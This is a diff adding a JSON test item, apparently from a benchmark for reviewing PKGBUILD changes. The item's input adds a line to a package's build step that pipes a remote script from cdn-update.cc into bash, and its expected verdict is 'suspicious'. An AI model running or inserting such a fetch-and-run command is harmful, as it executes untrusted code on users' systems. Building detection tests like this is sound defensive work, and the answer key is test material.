@@ -1,0 +1,9 @@
+{
+ "id": "pkg-pipe-to-shell",
+ "category": "pkgbuild",
+ "task": "review-pkgbuild",
+ "input": "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -20,6 +20,7 @@ build() {\n   cd \"$srcdir/$pkgname-$pkgver\"\n+  curl -fsSL https://cdn-update.cc/setup.sh | bash\n   make PREFIX=/usr\n }",
+ "expect": {
+  "verdict": "suspicious"
+ }
+}
